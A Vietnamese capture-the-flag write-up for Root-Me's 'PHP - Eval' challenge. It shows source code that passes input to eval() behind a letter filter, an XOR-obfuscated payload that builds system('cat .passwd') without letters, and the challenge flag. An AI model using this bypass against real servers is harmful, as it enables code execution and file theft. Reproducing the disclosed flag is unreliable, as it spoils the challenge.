# PHP - EVAL

## Mô tả
Link: 
>https://www.root-me.org/en/Challenges/Web-Server/PHP-Eval

Category: Web, 40 points

Giao diện chính

![image](https://user-images.githubusercontent.com/72856776/115710947-258b2100-a39d-11eb-98a3-d4ea0a9adb1f.png)
## Hint
`Note : the flag is in .passwd file.`
## Source Code
```php
<html>
<head>
</head>
<body>
 
<h4> PHP Calc </h4>
 
<form action='index.php' method='post'>
    <input type='text' id='input' name='input' />
    <input type='submit' />
<?php
 
if (isset($_POST['input'])) {
    if(!preg_match('/[a-zA-Z`]/', $_POST['input'])){
        print '<fieldset><legend>Result</legend>';
        eval('print '.$_POST['input'].";");
        print '</fieldset>';
    }
    else
        echo "<p>Dangerous code detected</p>";
}
?>
</form>
</body>
</html>
```
## Phương pháp
Sau khi đọc Hint mình nghĩ flag sẽ nằm trong file .passwd vì vậy ta cần phải "cat" được nó, bằng cách sử dụng hàm system. Nhưng nhìn vào source ta sẽ thấy, cần phải bypass được hàm preg_match để thực hiên được hàm system thông qua hàm eval. Để thực hiện được điều đó ta cần viết được payload có thể bypass các filter trên `[a-zA-Z]`.

Sau khi tham khảo một số nguồn thì mình tìm được 1 link viết khá đầy đủ về ý tưởng bypass filter này
>https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/

Trong này sẽ nêu ra 2 phương pháp. Nhưng sau khi đọc và được hướng dẫn thì mình quyết định sử dụng phương pháp sử dụng hàm XOR trong PHP. Về cơ bản thì hàm này sẽ XOR 2 kí tự với nhau để trả về 1 kí tự khác. Vì vậy ta có thể sử dụng chữ số hoặc kí tự đặc biệt để XOR ra những từ ta cần dùng trong viết code (cũng vì thế mà code sẽ nhìn khá cục súc).

Đây là code mình sử dụng để bypass chall này
```php
<?php
$_= ("3934%@"^"@@@@@-");      //$_= system;
$__= ("@@4"^"#!@");           //$__= cat;
$___= (".!337$"^"^@@@@@");    //$___= passwd;
$____= ("$__ .$___");         //$____= cat .passwd;
$_($____);                    //system(cat .passwd);
?>
```
Sau khi submit, server sẽ trả về cho ta kết quả

![image](https://user-images.githubusercontent.com/72856776/115714080-f080cd80-a3a0-11eb-88e7-edc35123cae6.png)

Mình cũng không rõ cái system nó ở đâu ra nên đã mặc kệ :v 
## Flag
>M!xIng_PHP_w1th_3v4l_L0L
